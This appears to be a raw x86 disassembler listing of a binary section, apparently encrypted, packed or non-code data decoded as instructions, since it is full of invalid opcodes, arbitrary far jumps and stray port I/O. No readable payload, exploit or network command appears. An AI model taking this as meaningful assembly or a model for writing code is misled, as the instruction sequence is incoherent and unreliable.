  414d16:	rcr    DWORD PTR [eax-0x48],1
  414d19:	jae    0x414cfe
  414d1b:	dec    ch
  414d1d:	js     0x414d45
  414d1f:	jmp    0xc1af:0xcbd3c534
  414d26:	mov    BYTE PTR fs:[edi+0x1e],bh
  414d2a:	rcr    DWORD PTR [ebx+0x21],1
  414d2d:	(bad)  
  414d2f:	or     eax,0x466eea33
  414d34:	inc    esi
  414d35:	loope  0x414d8a
  414d37:	out    dx,al
  414d38:	aaa    
  414d39:	add    edi,edx
  414d3b:	xor    eax,0x7ab3b96a
  414d40:	mov    edx,DWORD PTR [ebp-0xc239827]
  414d46:	aas    
  414d47:	std    
  414d48:	stos   BYTE PTR es:[edi],al
  414d49:	xchg   edx,eax
  414d4a:	mov    bh,0x85
  414d4c:	call   0x4b638b2f
  414d51:	sub    BYTE PTR [eax+0x4970d77a],0x37
  414d58:	mov    ds:0xfe0f1d14,eax
  414d5d:	xchg   ch,bl
  414d5f:	(bad)  
  414d61:	dec    esi
  414d62:	mov    ds:0x91e3f99,eax
  414d67:	xchg   edx,eax
  414d68:	cmp    ah,dl
  414d6a:	jg     0x414d5e
  414d6c:	sbb    al,0x46
  414d6e:	imul   esi,DWORD PTR [ebx+0x6f],0x24
  414d72:	enter  0x358b,0x63
  414d76:	jmp    0x668983f7
  414d7b:	mov    bl,0x2e
  414d7d:	ret    
  414d7e:	xor    eax,0xf55148d2
  414d83:	mov    al,0x34
  414d85:	push   eax
  414d86:	shr    BYTE PTR ds:0x41905418,1
  414d8c:	mov    ebp,0xbb535df4
  414d91:	cli    
  414d92:	mov    dl,0xe2
  414d94:	xchg   ebp,eax
  414d95:	cwde   
  414d96:	jmp    0x4abb:0x35d9b7bd
  414d9d:	in     al,0x69
  414d9f:	push   ebx
  414da0:	scas   eax,DWORD PTR es:[edi]
  414da1:	add    al,0xd8
  414da3:	push   ss
  414da4:	adc    eax,0xc78830eb
  414da9:	into   
  414daa:	and    al,0x9
  414dac:	test   al,0xea
  414dae:	add    DWORD PTR [eax],ecx
  414db0:	mov    DWORD PTR [esi],ebx
  414db2:	pop    ebp
  414db3:	mov    al,ds:0xe2536e1f
  414db8:	mov    al,0x60
  414dba:	test   al,0xbb
  414dbc:	mov    esp,0xb8230efc
  414dc1:	ins    BYTE PTR es:[edi],dx
  414dc2:	jno    0x414d79
  414dc4:	jl     0x414daa
  414dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dc7:	loope  0x414dc1
  414dc9:	sahf   
  414dca:	pop    esi
  414dcb:	dec    ebp
  414dcc:	or     ebx,esi
  414dce:	mov    edi,0x28dc9944
  414dd3:	call   0x5581:0x681797d0
  414dda:	jmp    0x3bb7:0x58cb9d26
  414de1:	add    DWORD PTR [esi-0x49],ebx
  414de4:	mov    eax,0xed3c3e3f
  414de9:	mov    WORD PTR [ebx-0x11],gs
  414dec:	lock out dx,al
  414dee:	or     DWORD PTR [ecx-0x57],esp
  414df1:	xor    ebp,DWORD PTR [ecx-0xb]
  414df4:	cld    
  414df5:	ins    DWORD PTR es:[edi],dx
  414df6:	xchg   ebx,eax
  414df7:	mov    ds:0x838ad866,al
  414dfc:	test   al,0xda
  414dfe:	cmp    esi,ecx
  414e00:	call   0x9b69:0xae9fa022
  414e07:	adc    eax,0x376b4237
  414e0c:	push   ebp
  414e0d:	xchg   edi,eax
  414e0e:	dec    DWORD PTR [ebp+eax*1+0x54877f23]
  414e15:	inc    eax
  414e16:	stos   DWORD PTR es:[edi],eax
  414e17:	cli    
  414e18:	outs   dx,DWORD PTR ds:[esi]
  414e19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e1a:	outs   dx,BYTE PTR ds:[esi]
  414e1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e1c:	mov    ch,0x16
  414e1e:	int3   
  414e1f:	cdq    
  414e20:	sub    edx,DWORD PTR [ecx+0xa]
  414e23:	pop    eax
  414e24:	imul   DWORD PTR [esi+0x7fa5ece0]
  414e2a:	hlt    
  414e2b:	retf   0x56c9
  414e2e:	nop
  414e2f:	sub    al,0x16
  414e31:	aam    0x5b
  414e33:	sahf   
  414e34:	fist   WORD PTR [edx-0x1341c332]
  414e3a:	stos   BYTE PTR es:[edi],al
  414e3b:	sbb    DWORD PTR [bp+0x52f9],ebp
  414e40:	jo     0x414e9a
  414e42:	mov    ebp,0x589e4f0b
  414e47:	mov    ds:0x582ee2f1,eax
  414e4c:	(bad)  
  414e4d:	push   ss
  414e4e:	call   0x41b5:0x454ec697
  414e55:	mov    eax,0x554fd537
  414e5a:	lea    eax,[ecx-0x12]
  414e5d:	inc    esp
  414e5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e5f:	clc    
  414e60:	dec    ecx
  414e61:	lods   al,BYTE PTR ds:[esi]
  414e62:	cwde   
  414e63:	imul   edi,edx,0x72
  414e66:	push   ecx
  414e67:	fdivr  DWORD PTR [eax+eiz*4+0xb335e4e]
  414e6e:	inc    edi
  414e6f:	iret   
  414e70:	dec    esp
  414e71:	mov    ebp,0xff5e3285
  414e76:	dec    edx
  414e77:	inc    ebp
  414e78:	cmp    eax,0x3978849a
  414e7d:	stos   DWORD PTR es:[edi],eax
  414e7e:	pop    edi
  414e7f:	cmp    esp,DWORD PTR [ecx+0x73]
  414e82:	pop    esp
  414e83:	xor    bl,BYTE PTR [edx+0x4e7bc4bf]
  414e89:	inc    esp
  414e8a:	xor    bl,ah
  414e8c:	xchg   ebp,eax
  414e8d:	cli    
  414e8e:	mov    bh,0xa7
  414e90:	dec    ebp
  414e91:	shl    BYTE PTR [ecx],0xbb
  414e94:	mov    BYTE PTR [edi+0x7cce12a6],0x62
  414e9b:	out    dx,eax
  414e9c:	imul   edi,DWORD PTR [esi-0x75],0xa4026b01
  414ea3:	xchg   edx,ebx
  414ea5:	jne    0x414e4a
  414ea7:	jns    0x414ebf
  414ea9:	push   0xffffffec
  414eab:	jbe    0x414e84
  414ead:	or     al,0x7f
  414eaf:	xor    eax,0x275fe608
  414eb4:	dec    edx
  414eb5:	sbb    ah,bh
  414eb7:	pop    eax
  414eb8:	pop    ecx
  414eb9:	add    eax,DWORD PTR [esi+0x4bc59828]
  414ebf:	aaa    
  414ec0:	push   0xffffff8f
  414ec2:	mov    bh,0x6e
  414ec4:	xchg   ecx,eax
  414ec5:	jbe    0x414e86
  414ec7:	outs   dx,BYTE PTR ds:[esi]
  414ec8:	shl    DWORD PTR [esi+0x4280a5d8],1
  414ece:	iret   
  414ecf:	rcl    DWORD PTR [ecx+ecx*1+0x61],1
  414ed3:	pop    eax
  414ed4:	add    al,0x5c
  414ed6:	mov    ds:0x2d428bd8,eax
  414edb:	adc    al,0x18
  414edd:	cmp    eax,0x87949bb3
  414ee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ee3:	test   DWORD PTR [edx+0x1405dd0f],ebp
  414ee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eea:	shl    BYTE PTR [edx+0x2ee42e46],cl
  414ef0:	cwde   
  414ef1:	jno    0x414ed6
  414ef3:	in     al,dx
  414ef4:	or     bh,dl
  414ef6:	fs jo  0x414eb9
  414ef9:	push   esp
  414efa:	loop   0x414f52
  414efc:	outs   dx,DWORD PTR ds:[esi]
  414efd:	xlat   BYTE PTR ds:[ebx]
  414efe:	iret   
  414eff:	or     BYTE PTR [ecx-0x44],dl
  414f02:	adc    al,0x7c
  414f04:	mov    ecx,0xc24ddc58
  414f09:	mov    al,ds:0x2ada3903
  414f0e:	pop    ecx
  414f0f:	inc    edi
  414f10:	lods   eax,DWORD PTR ds:[esi]
  414f11:	sbb    DWORD PTR [eax-0x3f],edi
  414f14:	xor    WORD PTR [ebx+0x50],si
  414f18:	mov    bl,0xce
  414f1a:	mov    eax,gs:0x423a9b9f
  414f20:	sub    al,0x6c
  414f22:	push   ecx
  414f23:	(bad)  
  414f24:	and    esp,DWORD PTR es:[eax-0x29618eab]
  414f2b:	nop
  414f2c:	cdq    
  414f2d:	xor    al,BYTE PTR [edi+0x6ae291b]
  414f33:	add    al,0xa2
  414f35:	mov    bh,0x22
  414f37:	fcmove st,st(5)
  414f39:	lods   al,BYTE PTR ds:[esi]
  414f3a:	pusha  
  414f3b:	(bad)  
  414f3c:	or     bl,BYTE PTR [edi]
  414f3e:	or     al,0x2d
  414f40:	jne    0x414f7a
  414f42:	jmp    0x530f:0xcef51786
  414f49:	mov    ch,0x60
  414f4b:	sbb    esp,DWORD PTR [eax+edx*4]
  414f4e:	xchg   esp,eax
  414f4f:	push   esp
  414f50:	fisttp WORD PTR [edx]
  414f52:	cmp    eax,DWORD PTR [ebx+0x36102d79]
  414f58:	int    0x57
  414f5a:	cmp    DWORD PTR [eax+0x11],0x1
  414f5e:	mov    ah,0x93
  414f60:	(bad)  
  414f61:	adc    esi,DWORD PTR [edx-0x2537baf1]
  414f67:	retf   0x8b8b
  414f6a:	mov    al,ds:0x6d459754
  414f6f:	inc    edi
  414f70:	mov    es,WORD PTR [edi]
  414f72:	dec    ebp
  414f73:	mov    cl,0x49
  414f75:	push   0x16
  414f77:	or     BYTE PTR [edx+0x4776f6b2],0x85
  414f7e:	dec    ebx
  414f7f:	in     al,dx
  414f80:	ret    
  414f81:	call   0x3402b517
  414f86:	or     al,0x93
  414f88:	mov    ah,0x48
  414f8a:	ficom  DWORD PTR [ebx]
  414f8c:	jle    0x414fb7
  414f8e:	pushf  
  414f8f:	xchg   esp,esi
  414f91:	out    dx,eax
  414f92:	xor    esi,DWORD PTR [ecx]
  414f94:	sbb    edi,DWORD PTR [ebx-0x5597e7c6]
  414f9a:	in     eax,0x5e
  414f9c:	jmp    0x415012
  414f9e:	mov    bh,0x75
  414fa0:	push   ebx
  414fa1:	xlat   BYTE PTR ds:[ebx]
  414fa2:	inc    esp
  414fa3:	test   DWORD PTR [ecx+0x52],edx
  414fa6:	cmp    dh,dh
  414fa8:	leave  
  414fa9:	or     esi,DWORD PTR [edi]
  414fab:	loope  0x414f9a
  414fad:	fadd   QWORD PTR [ebp-0x68]
  414fb0:	xchg   ebx,eax
  414fb1:	(bad)
  414fb4:	add    al,ch
  414fb6:	(bad)  
  414fb8:	mov    al,ds:0xa8b6914d
  414fbd:	imul   ecx,DWORD PTR [esi+0x4d],0xffffffb8
  414fc1:	mov    dh,0x10
  414fc3:	mov    al,ds:0xfbf45c78
  414fc8:	jb     0x414fff
  414fca:	call   0x4975d7fb
  414fcf:	stos   DWORD PTR es:[edi],eax
  414fd0:	jno    0x414f55
  414fd2:	(bad)  
  414fd3:	pushf  
  414fd4:	(bad)  
  414fd5:	(bad)  
  414fd6:	ds push edx
  414fd8:	stos   BYTE PTR es:[edi],al
  414fd9:	or     cl,ch
  414fdb:	push   edi
  414fdc:	xchg   ecx,eax
  414fdd:	push   esi
  414fde:	sbb    DWORD PTR [edi-0x1c],esp
  414fe1:	test   edi,ebp
  414fe3:	in     al,dx
  414fe4:	mov    ds:0x52b9bf2d,eax
  414fe9:	cs out dx,eax
  414feb:	xchg   ch,dl
  414fed:	fst    QWORD PTR [edx]
  414fef:	adc    BYTE PTR [ebp+ecx*4+0x75],0x22
  414ff4:	pop    edi
  414ff5:	es jae 0x414fd9
  414ff8:	jg     0x414f9a
  414ffa:	xor    ch,BYTE PTR [esi-0x31bc7090]
  415000:	adc    DWORD PTR [edx+0x572bb284],0x6e15f79b
  41500a:	jno    0x414fdb
  41500c:	pop    edx
  41500d:	lock into 
  41500f:	enter  0x51b6,0xb1
  415013:	push   esp
  415014:	mov    bl,0xf0
  415016:	test   al,0x95
  415018:	ja     0x41508b
  41501a:	fbld   TBYTE PTR ds:0xa0977c04
  415020:	popa   
  415021:	ret    
  415022:	push   ds
  415023:	adc    DWORD PTR [ebp-0x43b47642],0x4d230ad2
  41502d:	add    BYTE PTR [eax+eiz*2-0x3847b5ba],0x70
  415035:	imul   esp,DWORD PTR [eax+0x6d],0xb496ef7e
  41503c:	mov    ah,0xe0
  41503e:	int3   
  41503f:	(bad)  
  415040:	clc    
  415041:	sub    bh,dl
  415043:	pop    edi
  415044:	aad    0x9f
  415046:	xor    al,BYTE PTR [ecx]
  415048:	xchg   edi,eax
  415049:	mov    bh,0x70
  41504b:	and    bh,0x54
  41504e:	xchg   ebx,eax
  41504f:	add    DWORD PTR [edx+0x1f],0xfffffff8
  415053:	jnp    0x415068
  415055:	aaa    
  415056:	pop    edi
  415057:	mov    bl,BYTE PTR [esi]
  415059:	fdivr  QWORD PTR [edi+ecx*2-0x39ae6ae8]
  415060:	and    al,0x67
  415062:	and    edx,eax
  415064:	cmp    BYTE PTR [esi],bl
  415066:	stos   BYTE PTR es:[edi],al
  415067:	cwde   
  415068:	rcr    BYTE PTR [eax+0x1b55782e],1
  41506e:	repnz std 
  415070:	or     bl,BYTE PTR [ebx-0x69]
  415073:	(bad)  
  415074:	mov    edi,0xdcb0d3ca
  415079:	cli    
  41507a:	dec    eax
  41507b:	fidiv  DWORD PTR [ebx+0x55]
  41507e:	adc    esp,DWORD PTR [esi]
  415080:	mov    eax,0xfd2ae634
  415085:	mov    esp,es
  415087:	jle    0x4150f9
  415089:	jl     0x415104
  41508b:	addr16 jns 0x415102
  41508e:	pop    edx
  41508f:	mov    DWORD PTR [esi+eax*8+0x3b],ebx
  415093:	mov    bl,0x9d
  415095:	push   es
  415096:	fwait
  415097:	dec    edi
  415098:	xor    ebx,DWORD PTR [ebp+eax*4+0x74af8723]
  41509f:	mov    al,0xff
  4150a1:	das    
  4150a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150a3:	sahf   
  4150a4:	adc    cl,BYTE PTR [esp+ebx*2-0x3d]
  4150a8:	xchg   ecx,eax
  4150a9:	out    0x38,al
  4150ab:	xchg   BYTE PTR [ebp+0x15],dl
  4150ae:	pop    ebx
  4150af:	aam    0x4a
  4150b1:	mov    ebp,0x7b584cb0
  4150b6:	jae    0x4150a2
  4150b8:	(bad)  
  4150b9:	fwait
  4150ba:	or     BYTE PTR [edx],ch
  4150bc:	sub    bh,bl
  4150be:	call   0x2f1a:0xcb8c4079
  4150c5:	stos   DWORD PTR es:[edi],eax
  4150c6:	cmp    BYTE PTR [esi-0x2e],bl
  4150c9:	sub    eax,0x6b52e856
  4150ce:	pusha  
  4150cf:	sub    ch,dh
  4150d1:	add    BYTE PTR [esi-0x7c06399e],ch
  4150d7:	jmp    0xcb14:0x3dfd5ee0
  4150de:	push   ebx
  4150df:	(bad)
  4150e3:	pop    ss
  4150e4:	inc    eax
  4150e5:	lea    ebp,[esi+0x1a7a910d]
  4150eb:	(bad)  
  4150ec:	pop    edi
  4150ed:	fsubr  st,st(5)
  4150ef:	sbb    eax,0xda0bbf04
  4150f4:	ror    BYTE PTR [ecx-0x74],cl
  4150f7:	aad    0xcb
  4150f9:	mov    esi,0x281626ae
  4150fe:	lahf   
  4150ff:	sub    BYTE PTR [ecx+0x59d7d0f3],bl
  415105:	mov    WORD PTR [esi-0x16],?
  415108:	dec    edx
  415109:	aaa    
  41510a:	lahf   
  41510b:	mov    eax,ds:0xa27ef210
  415110:	mov    edx,0xacb30ca6
  415115:	rcr    DWORD PTR [ecx],0xe5
  415118:	into   
  415119:	dec    ebp
  41511a:	pusha  
  41511b:	mov    WORD PTR [eax],ss
  41511d:	das    
  41511e:	or     bh,dl
  415120:	fisttp WORD PTR [ebx-0x2cfb0a8b]
  415126:	mov    ebp,0xe688f626
  41512b:	xchg   edx,edx
  41512d:	adc    eax,0xb2eed033
  415132:	or     al,BYTE PTR [esi-0x5d]
  415135:	(bad)  
  415137:	and    dh,BYTE PTR [ebp-0x2c5d7354]
  41513d:	fcmovnb st,st(1)
  41513f:	and    ecx,ebp
  415141:	sub    eax,0xff237242
  415146:	aas    
  415147:	(bad)  
  415148:	jo     0x415138
  41514a:	in     eax,dx
  41514b:	fisubr WORD PTR [edi]
  41514d:	jp     0x41518d
  41514f:	xor    DWORD PTR [edi-0x65591590],edi
  415155:	lock test eax,0xa8529327
  41515b:	arpl   si,sp
  41515d:	push   esp
  41515e:	and    cl,bl
  415160:	stos   BYTE PTR es:[edi],al
  415161:	fnstenv [ecx-0x4b]
  415164:	mov    ebx,0xda546cb2
  415169:	or     DWORD PTR [edx],ebp
  41516b:	or     eax,0xdeed6eef
  415170:	pop    esp
  415171:	push   0x2575d66
  415176:	retf   
  415177:	fwait
  415178:	shr    DWORD PTR [eax-0x306e7269],1
  41517e:	sub    eax,0x302ab09a
  415183:	in     al,0x88
  415185:	sbb    eax,0x760d407d
  41518a:	mov    ebx,0xf6693171
  41518f:	stos   BYTE PTR es:[edi],al
  415190:	cmp    al,BYTE PTR [eax-0x2d]
  415193:	mov    ebp,0xb30502ad
  415198:	inc    eax
  415199:	inc    edi
  41519a:	lea    edi,[ebx+0x14bb21ac]
  4151a0:	sub    eax,0xb1953987
  4151a5:	jno    0x415206
  4151a7:	fistp  DWORD PTR [ecx]
  4151a9:	push   0x34
  4151ab:	aaa    
  4151ac:	mov    esp,0xd6c46b0d
  4151b1:	jb     0x4151ad
  4151b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151b4:	jle    0x4151cb
  4151b6:	push   es
  4151b7:	mov    edi,0xe14ead9a
  4151bc:	in     al,dx
  4151bd:	fsubr  QWORD PTR [ebx-0x40252e20]
  4151c3:	or     al,0xce
  4151c5:	rcr    DWORD PTR [edi-0x80],0xb6
  4151c9:	pop    ecx
  4151ca:	test   BYTE PTR [edi-0x4e],bl
  4151cd:	mov    edi,0x6681845b
  4151d2:	std    
  4151d3:	push   ss
  4151d4:	xor    DWORD PTR [edi+ebp*8],ecx
  4151d7:	in     al,0xbe
  4151d9:	dec    esi
  4151da:	mov    ah,al
  4151dc:	mov    bl,0xd0
  4151de:	loope  0x4151d4
  4151e0:	jns    0x4151a3
  4151e2:	pop    ss
  4151e3:	adc    edi,DWORD PTR [eax]
  4151e5:	mov    ebx,0xe19795cb
  4151ea:	push   es
  4151eb:	test   eax,0xda05b57c
  4151f0:	xchg   edi,eax
  4151f1:	addps  xmm0,xmm6
  4151f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151f5:	fidiv  DWORD PTR [ecx-0x3b0b4fd0]
  4151fb:	in     eax,dx
  4151fc:	add    edi,DWORD PTR [ebx]
  4151fe:	je     0x4151a0
  415200:	pop    ebx
  415201:	gs sub al,0x9
  415204:	xchg   esi,eax
  415205:	adc    al,0xa5
  415207:	mov    bh,BYTE PTR [esi+0x4b]
  41520a:	push   ss
  41520b:	mov    eax,0xe999e791
  415210:	ficomp DWORD PTR ds:0x87f4d86a
  415216:	push   ds
  415217:	scas   al,BYTE PTR es:[edi]
  415218:	sub    BYTE PTR ds:0x8c3fccc2,bh
  41521e:	das    
  41521f:	call   0xe275aeba
  415224:	or     eax,0x5343687f
  415229:	mov    eax,ds:0xe588191c
  41522e:	xchg   ebp,eax
  41522f:	inc    edx
  415230:	fnsave [ebx]
  415232:	loopne 0x415248
  415234:	push   eax
  415235:	xchg   edi,eax
  415236:	or     DWORD PTR [edi+eax*8-0x1aea28a9],edi
  41523d:	pop    ecx
  41523e:	jb     0x415222
  415240:	mov    dl,0xd9
  415242:	stc    
  415243:	shr    BYTE PTR ds:0x616c331a,1
  415249:	mov    bl,0x75
  41524b:	jbe    0x415277
  41524d:	leave  
  41524e:	(bad)  
  41524f:	fld    DWORD PTR [edi+0x3ea72017]
  415255:	in     al,0xd2
  415257:	loopne 0x4152b3
  415259:	mov    ds:0x19f6bc6f,al
  41525e:	test   DWORD PTR [ecx+0x74],0x2afafcde
  415265:	mov    esp,0x73da7cf2
  41526a:	ret    
  41526b:	in     eax,0x18
  41526d:	jbe    0x41528b
  41526f:	pop    ecx
  415270:	jmp    0x95a9acd4
  415275:	push   ebx
  415276:	ss enter 0xa521,0x62
  41527b:	dec    esp
  41527c:	out    0x37,al
  41527e:	ins    BYTE PTR es:[edi],dx
  41527f:	inc    ebx
  415280:	sub    dh,al
  415282:	xchg   dh,al
  415284:	jmp    0x4152f9
  415286:	cmp    esi,ebx
  415288:	sbb    bl,BYTE PTR [esi+0x37]
  41528b:	and    esp,DWORD PTR [edi-0x56]
  41528e:	jp     0x415280
  415290:	adc    al,0x1f
  415292:	call   0x826fe564
  415297:	sbb    DWORD PTR [esi],ebx
  415299:	fimul  WORD PTR [edi]
  41529b:	add    DWORD PTR [esi],ebx
  41529d:	aaa    
  41529e:	cmp    eax,0x7fddf957
  4152a3:	fldenv [ecx-0x4d8f17db]
  4152a9:	sbb    ebp,edi
  4152ab:	and    DWORD PTR [edi],ebx
  4152ad:	add    DWORD PTR [eax+0x617b979a],eax
  4152b3:	aaa    
  4152b4:	popa   
  4152b5:	repz lea esi,[eax]
  4152b8:	ret    
  4152b9:	bound  eax,QWORD PTR [eax+ebp*1-0x28]
  4152bd:	popf   
  4152be:	es aam 0xc0
  4152c1:	mov    cl,0xc2
  4152c3:	shl    bh,0x3d
  4152c6:	add    ah,cl
  4152c8:	add    al,0x23
  4152ca:	popf   
  4152cb:	and    dh,ch
  4152cd:	test   al,0x1e
  4152cf:	sub    ecx,DWORD PTR [ecx]
  4152d1:	and    BYTE PTR [eax+0x7f],0xde
  4152d5:	addr16 mov edi,0x209b76ff
  4152db:	aam    0xe1
  4152dd:	inc    eax
  4152de:	pusha  
  4152df:	ret    0x6b27
  4152e2:	imul   esi,eax,0xfffffff9
  4152e5:	jg     0x4152bb
  4152e7:	lds    esi,FWORD PTR [edi]
  4152e9:	or     ebp,esp
  4152eb:	pop    ebp
  4152ec:	mov    WORD PTR [eax+0x5],?
  4152ef:	xor    al,BYTE PTR [ebx+0x60]
  4152f2:	adc    BYTE PTR [edi+0x194a3c74],bh
  4152f8:	sbb    DWORD PTR [ecx-0x6c],0xffffffb7
  4152fc:	add    ecx,DWORD PTR [ebx-0x2fb86e95]
  415302:	je     0x4152c6
  415304:	cmp    al,0xcb
  415306:	pop    esp
  415307:	jmp    0x415339
  415309:	call   0xfb1d672d
  41530e:	cmp    al,0xf1
  415310:	mov    ds:0x315e2118,al
  415315:	fdiv   QWORD PTR [ecx-0x345ce23c]
  41531b:	inc    esi
  41531c:	mov    ecx,0x7395c220
  415321:	ret    
  415322:	test   edx,esp
  415324:	sub    ecx,esp
  415326:	fmul   st(7),st
  415328:	adc    al,0x35
  41532a:	icebp  
  41532b:	pop    ss
  41532c:	(bad)  
  41532d:	mov    eax,ds:0x7f9e45f3
  415332:	sub    BYTE PTR [edi+0x4d],dh
  415335:	mov    bh,0x9
  415337:	das    
  415338:	push   0x28
  41533a:	cwde   
  41533b:	xchg   ebp,eax
  41533c:	fistp  QWORD PTR [eax-0x46]
  41533f:	inc    ebp
  415340:	push   esp
  415341:	repz sbb al,0x4b
  415344:	les    ecx,FWORD PTR [esi-0x24]
  415347:	or     dh,BYTE PTR [ebp+0x4f]
  41534a:	mov    ebx,0x2fa3fddc
  41534f:	cmc    
  415350:	loope  0x4153a3
  415352:	mov    esi,0xc65f0539
  415357:	jp     0x4152ee
  415359:	mov    BYTE PTR [ebp+0x6],cl
  41535c:	ret    0xc5ad
  41535f:	cmp    BYTE PTR [edi-0x7a],dl
  415362:	mov    ds:0x713f334f,eax
  415367:	shl    BYTE PTR [eax+0x4e],0x9e
  41536b:	add    al,0x25
  41536d:	in     al,dx
  41536e:	scas   al,BYTE PTR es:[edi]
  41536f:	fisub  DWORD PTR [edx+0x2e]
  415372:	xchg   esp,eax
  415373:	sub    ecx,DWORD PTR [edi+0x3c]
  415376:	test   eax,0xb2e889f0
  41537b:	popf   
  41537c:	loope  0x4153e2
  41537e:	pop    ds
  41537f:	out    0xfb,al
  415381:	cmc    
  415382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415383:	xchg   ebx,eax
  415384:	loop   0x4153a8
  415386:	sbb    DWORD PTR [edi],ecx
  415388:	and    BYTE PTR [edi],ch
  41538a:	push   eax
  41538b:	adc    edx,DWORD PTR [ebp-0x2b974246]
  415391:	pop    ebp
  415392:	xor    esi,edi
  415394:	mov    edi,0x2d9b73bb
  415399:	or     eax,0xc36645f4
  41539e:	gs xchg edi,eax
  4153a0:	shl    DWORD PTR [esi-0x69d52695],0x1a
  4153a7:	stos   DWORD PTR es:[edi],eax
  4153a8:	cmp    eax,0xaeeef0d9
  4153ad:	dec    edi
  4153ae:	scas   eax,DWORD PTR es:[edi]
  4153af:	popa   
  4153b0:	jbe    0x41534e
  4153b2:	sbb    eax,0x7d3cb675
  4153b7:	(bad)  
  4153b8:	xchg   edx,eax
  4153b9:	adc    esi,DWORD PTR [ebx+0x7eb06cfb]
  4153bf:	push   esi
  4153c0:	mov    dh,BYTE PTR [esi+0x59]
  4153c3:	fdiv   QWORD PTR [ebp+0x747a535e]
  4153c9:	dec    eax
  4153ca:	dec    ebx
  4153cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153cc:	inc    ebp
  4153cd:	pop    ebx
  4153ce:	int3   
  4153cf:	push   edi
  4153d0:	mov    ds:0x2381cad9,al
  4153d5:	push   ecx
  4153d6:	loop   0x4153cd
  4153d8:	call   0xfa6ba5ad
  4153dd:	push   ebx
  4153de:	das    
  4153df:	push   cs
  4153e0:	dec    edi
  4153e1:	cmp    al,cl
  4153e3:	add    ecx,0x436ebd9f
  4153e9:	xchg   ebx,eax
  4153ea:	leave  
  4153eb:	icebp  
  4153ec:	lods   eax,DWORD PTR ds:[esi]
  4153ed:	inc    eax
  4153ee:	sbb    al,dl
  4153f0:	popa   
  4153f1:	jb     0x4153d2
  4153f3:	or     DWORD PTR [edx-0xe82e1c2],0x60
  4153fa:	mov    ebp,0x7519bef2
  4153ff:	leave  
  415400:	dec    edi
  415401:	inc    ebx
  415402:	xor    DWORD PTR [edi+0x1c],0x14
  415406:	xor    BYTE PTR [edx],al
  415408:	adc    ebp,DWORD PTR [edx]
  41540a:	js     0x41543f
  41540c:	sahf   
  41540d:	aad    0xb7
  41540f:	(bad)  
  415410:	ds mov dh,0xe3
  415413:	daa    
  415414:	ja     0x41544a
  415416:	adc    eax,0x5ae8a8d6
  41541b:	mov    al,BYTE PTR [ebx+0x62]
  41541e:	xlat   BYTE PTR ds:[ebx]
  41541f:	adc    al,0xa4
  415421:	daa    
  415422:	jge    0x415429
  415424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415425:	ret    
  415426:	rcr    DWORD PTR [ecx],0x97
  415429:	repz push ebp
  41542b:	or     al,0xb1
  41542d:	leave  
  41542e:	add    eax,0xe9a2dd8c
  415433:	mov    ds:0x5e8e5a22,al
  415438:	sub    ecx,DWORD PTR [eax+0xb]
  41543b:	mov    eax,ds:0x260c1995
  415440:	mov    DWORD PTR [edx],esp
  415442:	das    
  415443:	inc    ecx
  415444:	cli    
  415445:	sub    BYTE PTR [ebp+0x6810de83],bl
  41544b:	aaa    
  41544c:	inc    esp
  41544d:	popf   
  41544e:	jmp    0xebe81bee
  415453:	pop    ebx
  415454:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415456:	jnp    0x4153ed
  415458:	cmp    DWORD PTR [esi-0x2411eba5],esi
  41545e:	pop    edi
  41545f:	push   eax
  415460:	fst    QWORD PTR [ecx+0x69870b25]
  415466:	test   DWORD PTR [edi+edi*1],esi
  415469:	scas   eax,DWORD PTR es:[edi]
  41546a:	aam    0xa8
  41546c:	das    
  41546d:	es (bad) 
  41546f:	push   ebp
  415470:	inc    esp
  415471:	or     dh,BYTE PTR [edx+0x2f]
  415474:	cmp    al,bh
  415476:	pop    edx
  415477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415478:	push   esp
  415479:	mov    esi,0xe50ba5e3
  41547e:	adc    BYTE PTR [edi+0x5ede5b59],cl
  415484:	mov    ds:0x2792f1b7,eax
  415489:	xor    edi,0x44
  41548c:	std    
  41548d:	or     ebx,edi
  41548f:	pop    ss
  415490:	push   ebx
  415491:	or     dh,BYTE PTR [esp+ebx*2+0x57a49f26]
  415498:	ins    DWORD PTR es:[edi],dx
  415499:	nop
  41549a:	mov    esi,0x9f55c56f
  41549f:	(bad)  
  4154a0:	sub    ah,BYTE PTR [edi-0x1a520a2d]
  4154a6:	adc    bl,bl
  4154a8:	fstp   QWORD PTR [ecx+0x7d]
  4154ab:	inc    eax
  4154ac:	fdivr  QWORD PTR [ecx+0x7cd33a3a]
  4154b2:	pusha  
  4154b3:	les    edi,FWORD PTR [eax-0x67]
  4154b6:	lea    esp,[ebx-0x51]
  4154b9:	push   0xda938e83
  4154be:	add    edi,eax
  4154c0:	push   ebx
  4154c1:	stos   WORD PTR es:[edi],ax
  4154c3:	(bad)  
  4154c4:	fisttp DWORD PTR [esi+0x5cace6e1]
  4154ca:	xor    dh,BYTE PTR [ecx+eax*4+0x2a346e62]
  4154d1:	cmp    bh,dl
  4154d3:	out    0x14,eax
  4154d5:	div    BYTE PTR [eax-0xc5e097b]
  4154db:	dec    ebx
  4154dc:	lahf   
  4154dd:	inc    eax
  4154de:	imul   esp,DWORD PTR [edx-0x19],0x6f
  4154e2:	inc    ecx
  4154e3:	in     eax,0xca
  4154e5:	adc    ebp,DWORD PTR [ecx+0x6c]
  4154e8:	xchg   edx,eax
  4154e9:	mov    al,ds:0x692b12d1
  4154ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154ef:	and    eax,0x87a5963b
  4154f4:	sar    edi,cl
  4154f6:	repz push 0x912f7343
  4154fc:	xor    cl,BYTE PTR [eax-0x4b542f51]
  415502:	fisub  DWORD PTR [edx+0x4f]
  415505:	cdq    
